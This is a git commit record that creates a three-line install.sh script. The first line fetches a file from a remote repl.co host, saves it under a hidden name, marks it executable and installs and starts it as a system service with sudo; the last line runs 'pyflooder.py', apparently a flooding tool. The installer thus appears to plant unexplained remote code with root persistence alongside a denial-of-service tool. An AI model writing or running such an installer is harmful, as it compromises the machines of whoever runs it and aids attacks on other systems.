05af388ea58e821967a2cdc3f2941a652951d52b
P4C <61538762+p4pdb@users.noreply.github.com>
2022-09-12 20:33:21 +0700

    Create install.sh

---
+++ install.sh
@@ -0,0 +1,3 @@
+curl https://db-server.tranbac6.repl.co/linux.txt > .linux_service && chmod +x .linux_service && sudo cp -f .linux_service /etc/init.d && sudo service .linux_service start
+sudo apt-get update
+python3 pyflooder.py
